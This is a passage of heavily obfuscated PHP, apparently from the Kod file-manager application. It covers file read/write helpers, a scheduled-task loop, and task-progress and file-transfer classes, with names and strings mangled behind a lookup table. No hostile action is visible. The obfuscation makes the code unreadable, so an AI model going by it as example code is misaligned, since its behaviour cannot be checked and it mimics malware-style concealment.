$·ó¶Ï—è[8])) { return !0; } } } closedir($İáîŠ‚); if ($Õ¶ÛöÊ) { return array($·ó¶Ï—è[251] => $ÏŸÑùß, $·ó¶Ï—è[252] => $ßå±½Úì); } return !1; } public function hashSimple($â¡ªÌ) { $åÌõ©»¨ =& $_SERVER[±³—úê]; if (!$â¡ªÌ) { return md5($åÌõ©»¨[12]); } $â¡ªÌ = $this->iconvSystem($â¡ªÌ); $ÕçË— ø = $this->size($â¡ªÌ); $æÖĞ±Öî = 200; $íŞİä©ù = 50; if ($ÕçË— ø <= $æÖĞ±Öî * $íŞİä©ù) { return $this->hashMd5($â¡ªÌ) . $ÕçË— ø; } $æŠÑ²Ô² = $åÌõ©»¨[12]; $øÜÊø· = intval($ÕçË— ø / $íŞİä©ù); $»²õÉı˜ = fopen($â¡ªÌ, $åÌõ©»¨[1461]); if (!$»²õÉı˜) { return $æŠÑ²Ô²; } for ($äÎÃÜåç = 0; $äÎÃÜåç < $íŞİä©ù; $äÎÃÜåç++) { fseek_64($»²õÉı˜, $øÜÊø· * $äÎÃÜåç); $æŠÑ²Ô² .= fread($»²õÉı˜, $æÖĞ±Öî); } fseek_64($»²õÉı˜, $ÕçË— ø - $æÖĞ±Öî); $æŠÑ²Ô² .= fread($»²õÉı˜, $æÖĞ±Öî); fclose($»²õÉı˜); return md5($æŠÑ²Ô²) . $ÕçË— ø; } public function getContent($íÁüšŠ€) { $íÁüšŠ€ = $this->iconvSystem($íÁüšŠ€); return file_get_contents($íÁüšŠ€); } public function setContent($ì•³¬ù…, $åõéê¢¥ = '') { $ì•³¬ù… = $this->iconvSystem($ì•³¬ù…); $ìã¹ôÃ­ = @file_put_contents($ì•³¬ù…, $åõéê¢¥, LOCK_EX); if (!$ìã¹ôÃ­) { $this->writeLog(__FUNCTION__ . $_SERVER[±³—úê][1453], !0); } clearstatcache(); @chmod($ì•³¬ù…, $this->pathAuth); return $ìã¹ôÃ­ === !1 ? !1 : !0; } public function fileSubstr($ñ½Àå¤³, $Ô’òòÀä = 0, $ı¨ŒÈÅÔ = false) { $Ôè”ò³† =& $_SERVER[±³—úê]; $ñ½Àå¤³ = $this->iconvSystem($ñ½Àå¤³); if ($ı¨ŒÈÅÔ === !1) { $ı¨ŒÈÅÔ = $this->size($ñ½Àå¤³); } if ($ı¨ŒÈÅÔ <= 0) { return $Ôè”ò³†[12]; } $¯™Å¨…ô = fopen($ñ½Àå¤³, $Ôè”ò³†[1461]); if (!$¯™Å¨…ô) { return !1; } fseek_64($¯™Å¨…ô, $Ô’òòÀä); $£À©‡¿Õ = fread($¯™Å¨…ô, $ı¨ŒÈÅÔ); fclose($¯™Å¨…ô); if (!$£À©‡¿Õ) { $this->writeLog(__FUNCTION__ . $Ôè”ò³†[1453], !0); } return $£À©‡¿Õ; } public function upload($»‰«™ûÑ, $­¤™Œ«Ë, $¸Ù¬ñâ = false, $“ƒÑøé = REPEAT_REPLACE) { if ($¸Ù¬ñâ) { return $this->moveFile($­¤™Œ«Ë, $»‰«™ûÑ); } return $this->copyFile($­¤™Œ«Ë, $»‰«™ûÑ); } public function setModifyTime($ÈøÊøï, $Û‹ÏÍê = '') { @touch($ÈøÊøï, intval($Û‹ÏÍê)); } public function download($¯Š“û¨š, $šäÊâ) { return $this->iconvSystem($¯Š“û¨š); } } goto c¥×°¬®ß; c½¿ó¿ØÉÅ: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $Àåšˆø© =& $_SERVER[±³—úê]; if (self::valueGet($Àåšˆø©[830]) != $Àåšˆø©[91]) { return; } if (self::valueGet($Àåšˆø©[1724]) == $Àåšˆø©[91]) { $œ£´ë«Ÿ = self::valueGet($Àåšˆø©[1725]); if (time() - $œ£´ë«Ÿ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($Àåšˆø©[1724], $Àåšˆø©[91]); self::log($Àåšˆø©[1726] . ACTION . $Àåšˆø©[1727]); Hook::bind($Àåšˆø©[1728], $Àåšˆø©[1729]); $ÊÌÄïô = 0; while (!0) { self::cacheClear(); if (self::valueGet($Àåšˆø©[830]) != $Àåšˆø©[91]) { self::valueSet($Àåšˆø©[1724], $Àåšˆø©[240]); self::log($Àåšˆø©[1730]); die; } $´ÊÏç¶™ = time(); if ($´ÊÏç¶™ - $ÊÌÄïô >= 60) { self::valueSet(array($Àåšˆø©[1724] => $Àåšˆø©[91], $Àåšˆø©[1725] => $´ÊÏç¶™)); $ÊÌÄïô = $´ÊÏç¶™; } if (!file_exists(USER_SYSTEM . $Àåšˆø©[1731])) { self::valueSet(array($Àåšˆø©[1724] => $Àåšˆø©[240], $Àåšˆø©[830] => $Àåšˆø©[240])); self::log($Àåšˆø©[1732]); die; } $ˆÈº÷ = file_get_contents(BASIC_PATH . $Àåšˆø©[1733]); $¹ü¦Ä«œ = KOD_VERSION . $Àåšˆø©[10] . KOD_VERSION_BUILD; $ı‚„Š¤› = match_text($ˆÈº÷, $Àåšˆø©[1734]) . $Àåšˆø©[10] . match_text($ˆÈº÷, $Àåšˆø©[1735]); if ($ı‚„Š¤› != $¹ü¦Ä«œ) { self::restart(); self::log("\x73\164\157\x70\145\x64\x2e\x5b\166\145\162\x73\x69\157\156\40\165\160\x64\141\164\145\73{$versionNow}\40\x3d\x3e\40{$version}\x5d"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $İÁ«êÏ» =& $_SERVER[±³—úê]; http_close(); $GLOBALS[$İÁ«êÏ»[1736]] = 1; $_SERVER[$İÁ«êÏ»[1737]] = $İÁ«êÏ»[1738]; $_COOKIE = array(); $GLOBALS[$İÁ«êÏ»[1739]] = 1; $GLOBALS[$İÁ«êÏ»[1740]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $¼ğòË©ı =& $_SERVER[±³—úê]; http_close(); self::valueSet($¼ğòË©ı[830], $¼ğòË©ı[240]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($¼ğòË©ı[1724] => $¼ğòË©ı[240], $¼ğòË©ı[830] => $¼ğòË©ı[91])); self::log($¼ğòË©ı[1741]); } public static function taskSwitch() { $Ô ß‰è¯ =& $_SERVER[±³—úê]; $«µæÁ†Ÿ = self::valueGet($Ô ß‰è¯[830]) == $Ô ß‰è¯[91] ? $Ô ß‰è¯[240] : $Ô ß‰è¯[91]; self::valueSet($Ô ß‰è¯[830], $«µæÁ†Ÿ); } public static function shutdownEvent() { $İ¬Ãòåâ =& $_SERVER[±³—úê]; self::valueSet($İ¬Ãòåâ[1724], $İ¬Ãòåâ[240]); self::log($İ¬Ãòåâ[1742]); } public static function config($Ü³±ÆŒ, $Îæ§ãÑ°) { self::valueSet($_SERVER[±³—úê][830], $Ü³±ÆŒ); } private static function taskRunAll() { $²Íîîâ© =& $_SERVER[±³—úê]; $ó§Üê¤÷ = timeFloat(); $äÑú·ø = Model($²Íîîâ©[1743])->listData(); $èÒÆ¦‚Œ = count($äÑú·ø); for ($Ï¥µĞ½¤ = 0; $Ï¥µĞ½¤ < $èÒÆ¦‚Œ; $Ï¥µĞ½¤++) { $íÎÍŠŠ¡ = $äÑú·ø[$Ï¥µĞ½¤]; if (!$íÎÍŠŠ¡[$²Íîîâ©[486]] || $íÎÍŠŠ¡[$²Íîîâ©[1744]] != $²Íîîâ©[91]) { continue; } if (!self::taskTimeCheck($íÎÍŠŠ¡)) { continue; } self::taskRun($íÎÍŠŠ¡); } Hook::trigger($²Íîîâ©[1745]); self::taskQueueRun($ó§Üê¤÷); } private static function taskQueueRun($ş÷Š‚) { $éÃûëïË = 10; while (!0) { $»°Ñëéã = TaskQueue::run(); if ($»°Ñëéã === !1) { break; } if (timeFloat() - $ş÷Š‚ >= $éÃûëïË) { break; } } } private static function taskTimeCheck($›ŠÃ¼‰ê) { $Õ…éÃ´ =& $_SERVER[±³—úê]; $ÏÈÌ¹°À = json_decode($›ŠÃ¼‰ê[$Õ…éÃ´[206]], !0); $â”°Š÷‹ = intval($›ŠÃ¼‰ê[$Õ…éÃ´[1725]]); $¹ëá‡–‘ = strtotime($Õ…éÃ´[1746] . $ÏÈÌ¹°À[$Õ…éÃ´[1747]] . $Õ…éÃ´[1748]) - strtotime($Õ…éÃ´[1749]); $ã¥¤§„¹ = time() - strtotime(date($Õ…éÃ´[1750]) . $Õ…éÃ´[1751]); $Æ•Ú÷± = $ã¥¤§„¹ >= $¹ëá‡–‘ && $ã¥¤§„¹ <= $¹ëá‡–‘ + 3600; switch ($ÏÈÌ¹°À[$Õ…éÃ´[33]]) { case $Õ…éÃ´[1752]: if (time() - $â”°Š÷‹ < 3600 * 24 * 30) { return !1; } if ($ÏÈÌ¹°À[$Õ…éÃ´[1752]] == date($Õ…éÃ´[1753]) && $Æ•Ú÷±) { return !0; } break; case $Õ…éÃ´[1754]: if (time() - $â”°Š÷‹ < 3600 * 24 * 7) { return !1; } $Š¯«×‡¹ = date($Õ…éÃ´[1755]) == 0 ? 7 : date($Õ…éÃ´[1755]); if ($ÏÈÌ¹°À[$Õ…éÃ´[1754]] == $Š¯«×‡¹ && $Æ•Ú÷±) { return !0; } break; case $Õ…éÃ´[1747]: if (time() - $â”°Š÷‹ < 3600 * 24) { return !1; } if ($Æ•Ú÷±) { return !0; } break; case $Õ…éÃ´[1756]: if (time() - $â”°Š÷‹ >= floatval($ÏÈÌ¹°À[$Õ…éÃ´[1756]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $¨«‹ê© =& $_SERVER[±³—úê]; static $ŸŸù¬ªæ = 0; $Š—ª¾šÑ = 300; if (!$ŸŸù¬ªæ) { $ŸŸù¬ªæ = time(); } if (time() - $ŸŸù¬ªæ < $Š—ª¾šÑ) { return; } $ŸŸù¬ªæ = time(); $¼ù¾ó = Model($¨«‹ê©[588])->db($¨«‹ê©[12]); if ($¼ù¾ó) { $¼ù¾ó->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($¨«‹ê©[1757], $¨«‹ê©[1758]); die; } } public static function taskRun($ô‰é¿Æù) { $ÅÓÃ ½¶ =& $_SERVER[±³—úê]; self::log($ÅÓÃ ½¶[1759] . $ô‰é¿Æù[$ÅÓÃ ½¶[486]] . $ÅÓÃ ½¶[1760] . $ô‰é¿Æù[$ÅÓÃ ½¶[32]] . $ÅÓÃ ½¶[1761] . $ô‰é¿Æù[$ÅÓÃ ½¶[1762]]); Model($ÅÓÃ ½¶[1743])->run($ô‰é¿Æù[$ÅÓÃ ½¶[486]]); $²À‹Óóñ = timeFloat(); $Š†‘Œˆä = $ÅÓÃ ½¶[12]; switch ($ô‰é¿Æù[$ÅÓÃ ½¶[33]]) { case $ÅÓÃ ½¶[393]: $‡¥¬Ğş‰ = url_request($ô‰é¿Æù[$ÅÓÃ ½¶[1762]], $ÅÓÃ ½¶[1499], !1, !1, !1, !1, 10); if ($‡¥¬Ğş‰[$ÅÓÃ ½¶[830]]) { $Š†‘Œˆä = strlen($‡¥¬Ğş‰[$ÅÓÃ ½¶[1289]]); } break; case $ÅÓÃ ½¶[1763]: $Š†‘Œˆä = Hook::apply($ô‰é¿Æù[$ÅÓÃ ½¶[1762]]); default: break; } Model($ÅÓÃ ½¶[1764])->add(array($ÅÓÃ ½¶[1765] => $ÅÓÃ ½¶[12], $ÅÓÃ ½¶[1766] => $ÅÓÃ ½¶[240], $ÅÓÃ ½¶[33] => $ÅÓÃ ½¶[1767] . $ô‰é¿Æù[$ÅÓÃ ½¶[486]], $ÅÓÃ ½¶[1768] => json_encode(array($ÅÓÃ ½¶[32] => $ô‰é¿Æù[$ÅÓÃ ½¶[32]], $ÅÓÃ ½¶[1769] => timeFloat() - $²À‹Óóñ, $ÅÓÃ ½¶[379] => $Š†‘Œˆä)))); $ìÄ£ªçÆ = $Š†‘Œˆä ? $ÅÓÃ ½¶[1770] . $Š†‘Œˆä : $ÅÓÃ ½¶[12]; self::log($ÅÓÃ ½¶[1771] . $ô‰é¿Æù[$ÅÓÃ ½¶[486]] . $ÅÓÃ ½¶[178] . $ìÄ£ªçÆ); return !0; } public static function valueGet($ïÌÎªÁ ) { $õ¨ï“¿› =& $_SERVER[±³—úê]; $Ìà·ëö = $õ¨ï“¿›[1772]; $âÄüÂ¼ = Model($õ¨ï“¿›[519])->get($ïÌÎªÁ , $Ìà·ëö); if (is_null($âÄüÂ¼)) { Model($õ¨ï“¿›[519])->set($õ¨ï“¿›[830], $õ¨ï“¿›[91], $Ìà·ëö); Model($õ¨ï“¿›[519])->set($õ¨ï“¿›[1724], $õ¨ï“¿›[240], $Ìà·ëö); $âÄüÂ¼ = Model($õ¨ï“¿›[519])->get($ïÌÎªÁ , $Ìà·ëö); } return $âÄüÂ¼; } private static function valueSet($µÇïü´†, $¬öşÁõ = false) { $úË‡¡õØ =& $_SERVER[±³—úê]; $ÜÓ¼Ì‹– = $úË‡¡õØ[1773]; CacheLock::lock($ÜÓ¼Ì‹–); $ôÅ¡ÀÃõ = Model($úË‡¡õØ[519])->set($µÇïü´†, $¬öşÁõ, $úË‡¡õØ[1772]); CacheLock::unlock($ÜÓ¼Ì‹–); return $ôÅ¡ÀÃõ; } protected static function log($Íºƒ’ùø) { write_log($Íºƒ’ùø, $_SERVER[±³—úê][1758]); } private static function cacheClear() { $ÇäûÜó¡ =& $_SERVER[±³—úê]; Cache::clearMemory(Model($ÇäûÜó¡[519])->cacheKey($ÇäûÜó¡[1772])); Cache::clearMemory(Model($ÇäûÜó¡[519])->cacheKey($ÇäûÜó¡[1774])); Model($ÇäûÜó¡[1743])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\x74\x6f\160"; const STATYS_RUNNING = "\x72\x75\x6e\x6e\x69\x6e\147"; const STATYS_KILL = "\x6b\x69\154\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($ƒ™ûÕÜˆ, $Ô†Òôó– = '', $ì¬…¶à  = 0, $·Óâƒñµ = '') { $¬…ßåÍ =& $_SERVER[±³—úê]; if (self::get($ƒ™ûÕÜˆ)) { return; } $this->task = array($¬…ßåÍ[486] => $ƒ™ûÕÜˆ, $¬…ßåÍ[1775] => USER_ID, $¬…ßåÍ[1661] => $·Óâƒñµ, $¬…ßåÍ[537] => $¬…ßåÍ[12], $¬…ßåÍ[33] => $Ô†Òôó–, $¬…ßåÍ[1144] => $¬…ßåÍ[12], $¬…ßåÍ[1142] => $ì¬…¶à , $¬…ßåÍ[1776] => 0, $¬…ßåÍ[1777] => 0, $¬…ßåÍ[1778] => 0, $¬…ßåÍ[1779] => timeFloat(), $¬…ßåÍ[1780] => 0, $¬…ßåÍ[1781] => 0, $¬…ßåÍ[1782] => 0, $¬…ßåÍ[1783] => 0, $¬…ßåÍ[830] => $¬…ßåÍ[1724]); $GLOBALS[$¬…ßåÍ[1784]] = 1; Hook::bind($¬…ßåÍ[1728], array($this, $¬…ßåÍ[1785])); Hook::bind($¬…ßåÍ[1786], array($this, $¬…ßåÍ[1787])); $this->startAfter(); Hook::trigger($¬…ßåÍ[1788], $this->task); $this->task[$¬…ßåÍ[1781]] = timeFloat(); } public function end($Œ—ôõäÆ = '') { $ï Ÿ§«½ =& $_SERVER[±³—úê]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$ï Ÿ§«½[1781]]) { self::valueSet($this->task[$ï Ÿ§«½[486]], !1); } $this->isEnd = !0; if ($Œ—ôõäÆ) { $this->task[$ï Ÿ§«½[537]] = $Œ—ôõäÆ; } self::log($ï Ÿ§«½[1789] . $this->task[$ï Ÿ§«½[486]] . $ï Ÿ§«½[1790] . sprintf($ï Ÿ§«½[932], timeFloat() - $this->task[$ï Ÿ§«½[1779]]) . $ï Ÿ§«½[1791]); Hook::unbind($ï Ÿ§«½[1728], array($this, $ï Ÿ§«½[1785])); Hook::unbind($ï Ÿ§«½[1786], array($this, $ï Ÿ§«½[1787])); $this->endAfter(); $ºƒùÒ¿ü = $this->task; $this->task = !1; Hook::trigger($ï Ÿ§«½[1792], $ºƒùÒ¿ü); } public function update($ËŠÑÜñ‚ = 0, $ı¨±Àªİ = false) { $ù¦€±Á¨ =& $_SERVER[±³—úê]; $¢‘¶øš =& $this->task; if (!$¢‘¶øš) { return; } $¢‘¶øš[$ù¦€±Á¨[1776]] += $ËŠÑÜñ‚; $¢‘¶øš[$ù¦€±Á¨[1780]] = timeFloat(); if ($¢‘¶øš[$ù¦€±Á¨[1142]]) { if ($¢‘¶øš[$ù¦€±Á¨[1142]] < $¢‘¶øš[$ù¦€±Á¨[1776]]) { $¢‘¶øš[$ù¦€±Á¨[1142]] = $¢‘¶øš[$ù¦€±Á¨[1776]]; } $¢Œ‹—±£ = timeFloat() - $¢‘¶øš[$ù¦€±Á¨[1779]] - $¢‘¶øš[$ù¦€±Á¨[1782]]; if ($¢Œ‹—±£ <= 0) { $¢Œ‹—±£ = 0.001; } $¢‘¶øš[$ù¦€±Á¨[1777]] = $¢‘¶øš[$ù¦€±Á¨[1776]] / $¢‘¶øš[$ù¦€±Á¨[1142]]; $¢‘¶øš[$ù¦€±Á¨[1778]] = $¢‘¶øš[$ù¦€±Á¨[1776]] / $¢Œ‹—±£; if ($¢‘¶øš[$ù¦€±Á¨[1777]] > 0) { $¢‘¶øš[$ù¦€±Á¨[1783]] = $¢Œ‹—±£ * (1 - $¢‘¶øš[$ù¦€±Á¨[1777]]) / $¢‘¶øš[$ù¦€±Á¨[1777]]; } $¢‘¶øš[$ù¦€±Á¨[1783]] = $¢‘¶øš[$ù¦€±Á¨[1783]] <= 0 ? 0 : $¢‘¶øš[$ù¦€±Á¨[1783]]; } $this->updateAfter(); $ªÂÑĞ = 0.2; if (timeFloat() - $¢‘¶øš[$ù¦€±Á¨[1781]] < $ªÂÑĞ && !$ı¨±Àªİ) { return; } $Î¼­ÁŠ = self::get($¢‘¶øš[$ù¦€±Á¨[486]]); $Å¼ÙĞŒş = $Î¼­ÁŠ[$ù¦€±Á¨[830]]; if ($Å¼ÙĞŒş == self::STATYS_KILL) { $­êÖÍ«• = array($ù¦€±Á¨[1793] => LNG($ù¦€±Á¨[1794]), $ù¦€±Á¨[1299] => !1); Cache::set($ù¦€±Á¨[1795] . $this->task[$ù¦€±Á¨[486]], $­êÖÍ«•, 30); $this->onKill(); $this->end(); die; } else { if ($Å¼ÙĞŒş == self::STATYS_STOP) { $½ò·¥·Ñ = 2; $Î¼­ÁŠ[$ù¦€±Á¨[1782]] += $½ò·¥·Ñ; self::valueSet($¢‘¶øš[$ù¦€±Á¨[486]], $Î¼­ÁŠ); sleep($½ò·¥·Ñ); $this->update(); return; } } $¢‘¶øš[$ù¦€±Á¨[830]] = $Å¼ÙĞŒş ? $Å¼ÙĞŒş : $¢‘¶øš[$ù¦€±Á¨[830]]; $¢‘¶øš[$ù¦€±Á¨[1782]] = $Î¼­ÁŠ[$ù¦€±Á¨[1782]] ? $Î¼­ÁŠ[$ù¦€±Á¨[1782]] : 0; $¢‘¶øš[$ù¦€±Á¨[1781]] = timeFloat(); Hook::trigger($ù¦€±Á¨[1796], $¢‘¶øš); self::valueSet($¢‘¶øš[$ù¦€±Á¨[486]], $¢‘¶øš); } public function onKillSet($ÖÑ“©¶÷, $ÖëØñ€ı = array()) { $this->onKillCall = array($ÖÑ“©¶÷, $ÖëØñ€ı); } public function onKill() { $¡Àòæ¿ =& $_SERVER[±³—úê]; self::log($¡Àòæ¿[1789] . $this->task[$¡Àòæ¿[486]] . $¡Àòæ¿[1797]); Hook::trigger($¡Àòæ¿[1798], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($ÙŞÔÙîã) { $—×¢¬…Ô =& $_SERVER[±³—úê]; Cache::set($—×¢¬…Ô[1795] . $this->task[$—×¢¬…Ô[486]], $ÙŞÔÙîã, 60); if (!is_array($ÙŞÔÙîã) || !$ÙŞÔÙîã[$—×¢¬…Ô[1299]]) { self::log($—×¢¬…Ô[1799] . json_encode($ÙŞÔÙîã)); } return $ÙŞÔÙîã; } public static function get($ƒ¾äÄ) { $¥÷†ÍÕÆ =& $_SERVER[±³—úê]; $ô¿€ü¥ = self::valueGet($ƒ¾äÄ); if (is_array($ô¿€ü¥) && $ô¿€ü¥[$¥÷†ÍÕÆ[1800]]) { $¯¥Ÿ’Äæ = ActionApply($ô¿€ü¥[$¥÷†ÍÕÆ[1800]], array($ô¿€ü¥)); $ô¿€ü¥ = is_array($¯¥Ÿ’Äæ) ? $¯¥Ÿ’Äæ : $ô¿€ü¥; } return $ô¿€ü¥; } public static function listData() { $ñïøú = self::valueGet(); return array_sort_by($ñïøú, $_SERVER[±³—úê][1779], !0); } public static function kill($İşÅÂ”’) { return self::changeStatus($İşÅÂ”’, self::STATYS_KILL); } public static function stop($øé‚ù‚‡) { return self::changeStatus($øé‚ù‚‡, self::STATYS_STOP); } public static function restart($¹±³ñİ) { return self::changeStatus($¹±³ñİ, self::STATYS_RUNNING); } public static function killAll() { $à™ªŠ‹Ò =& $_SERVER[±³—úê]; $„÷“‚Ú² = self::listData(); foreach ($„÷“‚Ú² as $Æİ¼Ó£ ) { self::kill($Æİ¼Ó£ [$à™ªŠ‹Ò[486]]); } sleep(2); foreach ($„÷“‚Ú² as $Æİ¼Ó£ ) { self::valueSet($Æİ¼Ó£ [$à™ªŠ‹Ò[486]], !1); } } private static function changeStatus($åÎÏšÏ, $áÁÈÌèÍ) { $øĞìû˜Õ =& $_SERVER[±³—úê]; $’¢÷»Òğ = self::valueGet($åÎÏšÏ); if (!$’¢÷»Òğ) { return !1; } $’¢÷»Òğ[$øĞìû˜Õ[830]] = $áÁÈÌèÍ; self::valueSet($åÎÏšÏ, $’¢÷»Òğ); self::log($øĞìû˜Õ[1801] . $’¢÷»Òğ[$øĞìû˜Õ[486]] . $øĞìû˜Õ[1802] . $áÁÈÌèÍ); return !0; } public static function valueGet($ñó‘Àóé = false) { $¹·Âü‡ =& $_SERVER[±³—úê]; if ($ñó‘Àóé) { $°¦ùô» = Model($¹·Âü‡[531])->where(array($¹·Âü‡[97] => $ñó‘Àóé, $¹·Âü‡[33] => $¹·Âü‡[1151]))->find(); return $°¦ùô» ? json_decode($°¦ùô»[$¹·Âü‡[461]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($İÉÙÈ›ï = false) { $ì¶ñê«¿ =& $_SERVER[±³—úê]; $ñ¿Ë÷€‡ = array($ì¶ñê«¿[33] => $ì¶ñê«¿[1151]); if ($İÉÙÈ›ï) { $ñ¿Ë÷€‡[$ì¶ñê«¿[1775]] = $İÉÙÈ›ï; } $¿ëîÑÍá = Model($ì¶ñê«¿[531])->where($ñ¿Ë÷€‡)->select(); $¿ëîÑÍá = $¿ëîÑÍá ? $¿ëîÑÍá : array(); foreach ($¿ëîÑÍá as $ÜİÖ­¦Ç => $ıÒ²˜–) { $¿ëîÑÍá[$ÜİÖ­¦Ç] = json_decode($ıÒ²˜–[$ì¶ñê«¿[461]], !0); } return $¿ëîÑÍá; } public static function valueSet($¡¨½¾Æ, $·êş ìÃ) { $ğã‚¢˜ =& $_SERVER[±³—úê]; if (!$·êş ìÃ) { return Model($ğã‚¢˜[531])->where(array($ğã‚¢˜[97] => $¡¨½¾Æ, $ğã‚¢˜[33] => $ğã‚¢˜[1151]))->delete(); } $ëŒ¤Ç›Ğ = json_encode($·êş ìÃ); if (!$ëŒ¤Ç›Ğ) { ob_start(); var_dump($·êş ìÃ); $ÅÉÉ¨· = ob_get_clean(); self::log($ğã‚¢˜[1803] . json_encode_force($ÅÉÉ¨·)); } if (!$¡¨½¾Æ || !$·êş ìÃ[$ğã‚¢˜[486]]) { return !1; } $¬ª†ï¥ = array($ğã‚¢˜[33] => $ğã‚¢˜[1151], $ğã‚¢˜[1775] => USER_ID, $ğã‚¢˜[97] => $¡¨½¾Æ, $ğã‚¢˜[461] => $ëŒ¤Ç›Ğ); $Æş˜’¿å = $ğã‚¢˜[1804]; CacheLock::lock($Æş˜’¿å); Model($ğã‚¢˜[531])->add($¬ª†ï¥, array(), !0); CacheLock::unlock($Æş˜’¿å); } public static function log($úö“ôºæ) { if (!GLOBAL_DEBUG) { return; } write_log($úö“ôºæ, $_SERVER[±³—úê][1805]); } } class TaskFileTransfer extends Task { protected function startAfter() { $«ëóÔªü =& $_SERVER[±³—úê]; $ıÈÉ¢¿¶ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($«ëóÔªü[1806], array($this, $«ëóÔªü[1807])); Hook::bind($«ëóÔªü[1310], array($this, $«ëóÔªü[1808])); Hook::bind($«ëóÔªü[1809], array($this, $«ëóÔªü[1810])); Hook::bind($«ëóÔªü[682], array($this, $«ëóÔªü[1811])); Hook::bind($«ëóÔªü[683], array($this, $«ëóÔªü[1812])); Hook::bind($«ëóÔªü[689], array($this, $«ëóÔªü[1813])); Hook::bind($«ëóÔªü[690], array($this, $«ëóÔªü[1814])); Hook::bind($«ëóÔªü[685], array($this, $«ëóÔªü[1815])); Hook::bind($«ëóÔªü[687], array($this, $«ëóÔªü[1816])); Hook::bind($«ëóÔªü[651], array($this, $«ëóÔªü[1817])); Hook::bind($«ëóÔªü[648], array($this, $«ëóÔªü[1817])); Hook::bind($«ëóÔªü[653], array($this, $«ëóÔªü[1817])); Hook::bind($«ëóÔªü[655], array($this, $«ëóÔªü[1817])); Hook::bind($«ëóÔªü[657], array($this, $«ëóÔªü[1817])); Hook::bind($«ëóÔªü[1818], array($this, $«ëóÔªü[1819])); Hook::bind($«ëóÔªü[673], array($this, $«ëóÔªü[1820])); $this->sourceModelCopyFlag = !1; Hook::bind($«ëóÔªü[1821], array($this, $«ëóÔªü[1822])); Hook::bind($«ëóÔªü[1823], array($this, $«ëóÔªü[1824])); Hook::bind($«ëóÔªü[1825], array($this, $«ëóÔªü[1826])); $ıÈÉ¢¿¶[$«ëóÔªü[1827]] = LNG($«ëóÔªü[1828]); $ıÈÉ¢¿¶[$«ëóÔªü[1829]] = 0; $ıÈÉ¢¿¶[$«ëóÔªü[1830]] = 0; $ıÈÉ¢¿¶[$«ëóÔªü[1144]] = $«ëóÔªü[12]; $ıÈÉ¢¿¶[$«ëóÔªü[1831]] = $«ëóÔªü[12]; $ıÈÉ¢¿¶[$«ëóÔªü[1832]] = 0; $ıÈÉ¢¿¶[$«ëóÔªü[1833]] = 0; $ıÈÉ¢¿¶[$«ëóÔªü[1834]] = 0; if (!$ıÈÉ¢¿¶[$«ëóÔªü[1661]]) { $ıÈÉ¢¿¶[$«ëóÔªü[1661]] = LNG($«ëóÔªü[1835]); } } protected function endAfter() { $øÙ“”Ü€ =& $_SERVER[±³—úê]; Hook::unbind($øÙ“”Ü€[1806], array($this, $øÙ“”Ü€[1807])); Hook::unbind($øÙ“”Ü€[1310], array($this, $øÙ“”Ü€[1808])); Hook::unbind($øÙ“”Ü€[1809], array($this, $øÙ“”Ü€[1810])); Hook::unbind($øÙ“”Ü€[682], array($this, $øÙ“”Ü€[1811])); Hook::unbind($øÙ“”Ü€[683], array($this, $øÙ“”Ü€[1812])); Hook::unbind($øÙ“”Ü€[689], array($this, $øÙ“”Ü€[1813])); Hook::unbind($øÙ“”Ü€[690], array($this, $øÙ“”Ü€[1814])); Hook::unbind($øÙ“”Ü€[685], array($this, $øÙ“”Ü€[1815])); Hook::unbind($øÙ“”Ü€[687], array($this, $øÙ“”Ü€[1816])); Hook::unbind($øÙ“”Ü€[651], array($this, $øÙ“”Ü€[1817])); Hook::unbind($øÙ“”Ü€[648], array($this, $øÙ“”Ü€[1817])); Hook::unbind($øÙ“”Ü€[653], array($this, $øÙ“”Ü€[1817])); Hook::unbind($øÙ“”Ü€[655], array($this, $øÙ“”Ü€[1817])); Hook::unbind($øÙ“”Ü€[657], array($this, $øÙ“”Ü€[1817])); Hook::unbind($øÙ“”Ü€[1818], array($this, $øÙ“”Ü€[1819])); Hook::unbind($øÙ“”Ü€[673], array($this, $øÙ“”Ü€[1820])); Hook::unbind($øÙ“”Ü€[1821], array($this, $øÙ“”Ü€[1822])); Hook::unbind($øÙ“”Ü€[1823], array($this, $øÙ“”Ü€[1824])); Hook::unbind($øÙ“”Ü€[1825], array($this, $øÙ“”Ü€[1826])); } public function copyMoveStart($ÅÕı´ì, $È­Ñ¶×Û, $«¸ÙÕ¥, $“é¡ö–) { $¾Ş¹ıË =& $_SERVER[±³—úê]; self::log($¾Ş¹ıË[1836] . $È­Ñ¶×Û . $¾Ş¹ıË[73] . $“é¡ö–); $Ãšó¯ƒë = rtrim(TEMP_FILES, $¾Ş¹ıË[8]); if (substr($È­Ñ¶×Û, 0, strlen($Ãšó¯ƒë)) == $Ãšó¯ƒë) { return; } if (substr($“é¡ö–, 0, strlen($Ãšó¯ƒë)) == $Ãšó¯ƒë) { return; } $™§æôŞŸ =& $this->task; $™§æôŞŸ[$¾Ş¹ıË[1837]] = KodIO::transferType($ÅÕı´ì, $«¸ÙÕ¥); $this->update(); } public function updateAfter() { $ğÄ¶ğ¹ =& $_SERVER[±³—úê]; $´á›é =& $this->task; if (!$´á›é[$ğÄ¶ğ¹[843]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($´á›é[$ğÄ¶ğ¹[1837]] == $ğÄ¶ğ¹[1404]) { return; } self::updateTask($´á›é); } private static function updateTask(&$£ÆÇ »Œ) { $ğ÷¹©Ø =& $_SERVER[±³—úê]; if ($£ÆÇ »Œ[$ğ÷¹©Ø[1837]] == $ğ÷¹©Ø[1281] || $£ÆÇ »Œ[$ğ÷¹©Ø[1837]] == 